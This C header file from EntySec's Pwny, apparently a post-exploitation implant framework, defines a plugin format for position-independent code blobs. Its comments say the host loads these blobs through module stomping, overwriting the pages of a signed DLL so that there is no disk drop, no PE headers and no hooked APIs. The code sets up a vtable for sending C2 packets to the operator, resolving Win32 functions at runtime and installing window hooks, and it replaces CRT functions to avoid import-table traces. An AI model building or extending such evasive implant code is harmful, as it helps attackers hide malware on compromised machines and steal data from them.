/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Code-Only Tab (COT) header.
 *
 * COT plugins are flat position-independent code blobs with zero PE
 * structure. All external calls go through a vtable passed at
 * initialization.
 *
 * Build-time: the plugin is compiled as a DLL, then a post-build tool
 * (pe2cot.py) strips it to raw .text + .rdata, producing a .cot blob.
 *
 * Runtime: the host loads a sacrificial signed DLL (module stomping),
 * overwrites its pages with the COT blob, and calls the entry point
 * through the vtable.
 *
 * Result: no disk drop, no PE headers in memory, all executable pages
 * backed by a legitimate signed module (VAD clean), no hooked APIs.
 */

#ifndef _TAB_COT_H_
#define _TAB_COT_H_

#include <stdint.h>

/* Forward declarations — compatible with the real headers.
 * If the real header is included before tab_cot.h the forward
 * declaration is simply redundant (C allows this).  */
typedef struct api_calls_table api_calls_t;
typedef struct pipes_table pipes_t;
typedef struct pipe_callbacks pipe_callbacks_t;
typedef struct c2_table c2_t;
typedef struct tlv_pkt tlv_pkt_t;
typedef tlv_pkt_t *(*api_t)(c2_t *);

/* ------------------------------------------------------------------ */
/* COT binary format                                                   */
/* ------------------------------------------------------------------ */

/*
 * Layout of a .cot file:
 *
 *   [cot_header_t]          40 bytes
 *   [flat code+rodata+data] variable
 *   [reloc table]           reloc_count * 4 bytes
 *
 * The entry offset is relative to the start of the code (after header).
 * If the plugin has writable data (.data/.bss) the rw_offset/rw_size
 * fields tell the loader which sub-region needs PAGE_READWRITE.
 *
 * v2 adds base relocation support: original_base stores the link-time
 * base address, and reloc_count DIR64 fixup offsets follow the blob.
 * The loader applies delta = runtime_base - original_base to each.
 */

#define COT_MAGIC    0x00544F43  /* "COT\0" little-endian */
#define COT_VERSION  2

typedef struct __attribute__((packed))
{
    uint32_t magic;           /* COT_MAGIC */
    uint32_t version;         /* 2 */
    uint32_t entry_offset;    /* offset of TabInitCOT from code start */
    uint32_t code_size;       /* total size of flat code blob */
    uint32_t rw_offset;       /* offset of writable region (0 = none) */
    uint32_t rw_size;         /* size of writable region (0 = none) */
    uint64_t original_base;   /* ImageBase + base_va (link-time address) */
    uint32_t reloc_count;     /* number of DIR64 fixup entries after blob */
    uint32_t _pad;            /* alignment padding */
} cot_header_t;

/* ------------------------------------------------------------------ */
/* Vtable — populated by the host, passed to every COT plugin          */
/* ------------------------------------------------------------------ */

typedef struct
{
    /* Registration */
    void (*api_call_register)(api_calls_t **tbl, int tag, api_t fn);
    void (*api_pipe_register)(pipes_t **tbl, int type, pipe_callbacks_t cb);

    /* TLV packet lifecycle */
    tlv_pkt_t *(*api_craft_tlv_pkt)(int status, tlv_pkt_t *request);
    tlv_pkt_t *(*tlv_pkt_create)(void);
    void       (*tlv_pkt_destroy)(tlv_pkt_t *pkt);

    /* TLV add */
    int (*tlv_pkt_add_u32)(tlv_pkt_t *pkt, int type, int32_t val);
    int (*tlv_pkt_add_string)(tlv_pkt_t *pkt, int type, char *str);
    int (*tlv_pkt_add_bytes)(tlv_pkt_t *pkt, int type,
                             unsigned char *buf, size_t len);
    int (*tlv_pkt_add_tlv)(tlv_pkt_t *pkt, int type, tlv_pkt_t *child);

    /* TLV get */
    int (*tlv_pkt_get_u32)(tlv_pkt_t *pkt, int type, int32_t *out);
    int (*tlv_pkt_get_string)(tlv_pkt_t *pkt, int type, char *out);
    int (*tlv_pkt_get_bytes)(tlv_pkt_t *pkt, int type, unsigned char **out);

    /* Logging */
    void (*log_debug)(const char *fmt, ...);

    /* Generic resolver for anything else the plugin needs */
    void *(*resolve)(const char *module, const char *func);

    /* CRT heap functions (from former reserved slots) */
    void *(*crt_malloc)(size_t size);
    void  (*crt_free)(void *ptr);
    void *(*crt_calloc)(size_t nmemb, size_t size);

    /* C2 enqueue — push unsolicited TLV packets to the Python side */
    int (*c2_enqueue_tlv)(c2_t *c2, tlv_pkt_t *pkt);

    /* Module handle of the stomped DLL hosting this COT plugin.
     * Needed for SetWindowsHookExA etc. where the callback lives
     * inside the stomped module, not in the main executable. */
    void *hModule;

    /* Reserved for future expansion */
    void *_reserved[3];
} tab_vtable_t;

/* COT plugin entry point signature */
typedef void (*cot_init_t)(tab_vtable_t *vt,
                           api_calls_t **api_calls,
                           pipes_t **pipes);

/* ------------------------------------------------------------------ */
/* Plugin-side macros — transparent vtable indirection                 */
/*                                                                     */
/* Usage in a COT plugin:                                              */
/*   #include <pwny/tab_cot.h>                                        */
/*   COT_DECLARE_VT                                                    */
/*   ... use api_call_register, tlv_pkt_create, etc. normally ...      */
/*   COT_ENTRY(my_init) { api_call_register(&calls, TAG, handler); }  */
/* ------------------------------------------------------------------ */

#ifdef COT_PLUGIN  /* defined when building as a COT blob */

/* Tab base — same value as in tab_dll.h / tab.h so that
 * TLV_TAG_CUSTOM(API_CALL_DYNAMIC, TAB_BASE, ...) works. */
#ifndef TAB_BASE
#define TAB_BASE 2
#endif

/* Global vtable pointer — set by the entry trampoline */
static tab_vtable_t *_cot_vt;

#define COT_DECLARE_VT  /* already declared above */

/* Redirect Pwny API calls through the vtable */
#define api_call_register(tbl, tag, fn) _cot_vt->api_call_register(tbl, tag, fn)
#define api_pipe_register(tbl, t, cb)   _cot_vt->api_pipe_register(tbl, t, cb)
#define api_craft_tlv_pkt(s, r)         _cot_vt->api_craft_tlv_pkt(s, r)
#define tlv_pkt_create()                _cot_vt->tlv_pkt_create()
#define tlv_pkt_destroy(p)              _cot_vt->tlv_pkt_destroy(p)
#define tlv_pkt_add_u32(p, t, v)        _cot_vt->tlv_pkt_add_u32(p, t, v)
#define tlv_pkt_add_string(p, t, s)     _cot_vt->tlv_pkt_add_string(p, t, s)
#define tlv_pkt_add_bytes(p, t, b, l)   _cot_vt->tlv_pkt_add_bytes(p, t, b, l)
#define tlv_pkt_add_tlv(p, t, c)        _cot_vt->tlv_pkt_add_tlv(p, t, c)
#define tlv_pkt_get_u32(p, t, o)        _cot_vt->tlv_pkt_get_u32(p, t, (int32_t*)(o))
#define tlv_pkt_get_string(p, t, o)     _cot_vt->tlv_pkt_get_string(p, t, o)
#define tlv_pkt_get_bytes(p, t, o)      _cot_vt->tlv_pkt_get_bytes(p, t, o)

#ifdef DEBUG
#define log_debug(...)                  _cot_vt->log_debug(__VA_ARGS__)
#else
#define log_debug(...)                  ((void)0)
#endif

/* Resolve arbitrary Win32 function at runtime */
#define cot_resolve(mod, fn) _cot_vt->resolve(mod, fn)

/* ---- CRT heap functions via vtable ---- */

#define malloc(s)      _cot_vt->crt_malloc(s)
#define free(p)        _cot_vt->crt_free(p)
#define calloc(n, s)   _cot_vt->crt_calloc(n, s)

/* C2 enqueue for push-based pipe events */
#define c2_enqueue_tlv(c2, pkt) _cot_vt->c2_enqueue_tlv(c2, pkt)

/* Stomped module handle — use for SetWindowsHookExA hMod parameter */
#define cot_hModule ((HMODULE)_cot_vt->hModule)

/* ---- Inline CRT replacements (avoid IAT dependency) ---- */

static __inline void *_cot_memcpy(void *d, const void *s, size_t n)
{
    volatile unsigned char *dd = (volatile unsigned char *)d;
    const unsigned char *ss = (const unsigned char *)s;
    while (n--) *dd++ = *ss++;
    return d;
}

static __inline void *_cot_memset(void *d, int c, size_t n)
{
    volatile unsigned char *dd = (volatile unsigned char *)d;
    while (n--) *dd++ = (unsigned char)c;
    return d;
}

static __inline int _cot_memcmp(const void *a, const void *b, size_t n)
{
    const unsigned char *pa = (const unsigned char *)a;
    const unsigned char *pb = (const unsigned char *)b;
    for (; n > 0; n--, pa++, pb++)
        if (*pa != *pb) return *pa - *pb;
    return 0;
}

static __inline size_t _cot_strlen(const char *s)
{
    const char *p = s;
    while (*p) p++;
    return (size_t)(p - s);
}

static __inline int _cot_strcmp(const char *a, const char *b)
{
    while (*a && (*a == *b)) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

static __inline int _cot_strncmp(const char *a, const char *b, size_t n)
{
    for (; n > 0; n--, a++, b++) {
        if (*a != *b) return (unsigned char)*a - (unsigned char)*b;
        if (*a == '\0') return 0;
    }
    return 0;
}

static __inline char *_cot_strcpy(char *d, const char *s)
{
    char *r = d;
    while ((*d++ = *s++));
    return r;
}

static __inline char *_cot_strcat(char *d, const char *s)
{
    char *r = d;
    while (*d) d++;
    while ((*d++ = *s++));
    return r;
}

static __inline char *_cot_strchr(const char *s, int c)
{
    for (; *s; s++)
        if (*s == (char)c) return (char *)s;
    return (c == '\0') ? (char *)s : (char *)0;
}

static __inline char *_cot_strstr(const char *h, const char *n)
{
    size_t nlen;
    if (*n == '\0') return (char *)h;
    nlen = _cot_strlen(n);
    for (; *h; h++)
        if (_cot_strncmp(h, n, nlen) == 0) return (char *)h;
    return (char *)0;
}

static __inline int _cot_stricmp(const char *a, const char *b)
{
    for (;;) {
        int ca = (unsigned char)*a++;
        int cb = (unsigned char)*b++;
        if (ca >= 'A' && ca <= 'Z') ca += 32;
        if (cb >= 'A' && cb <= 'Z') cb += 32;
        if (ca != cb) return ca - cb;
        if (ca == 0) return 0;
    }
}

#define memcpy      _cot_memcpy
#define memset      _cot_memset
#define memcmp      _cot_memcmp
#define strlen      _cot_strlen
#define strcmp       _cot_strcmp
#define strncmp     _cot_strncmp
#define strcpy      _cot_strcpy
#define strcat      _cot_strcat
#define strchr      _cot_strchr
#define strstr      _cot_strstr
#define _stricmp    _cot_stricmp

/*
 * COT_ENTRY — defines the TabInitCOT export as well as the
 * boilerplate that stashes the vtable pointer.
 *
 * The body after the macro is the plugin's init code.
 */
#define COT_ENTRY                                                 \
    static void _cot_plugin_init(api_calls_t **api_calls,        \
                                 pipes_t **pipes);                \
    __declspec(dllexport)                                          \
    void TabInitCOT(tab_vtable_t *vt,                              \
                    api_calls_t **api_calls,                        \
                    pipes_t **pipes)                                \
    {                                                              \
        _cot_vt = vt;                                              \
        _cot_plugin_init(api_calls, pipes);                        \
    }                                                              \
    static void _cot_plugin_init(api_calls_t **api_calls,         \
                                 pipes_t **pipes)

#endif /* COT_PLUGIN */

#endif /* _TAB_COT_H_ */
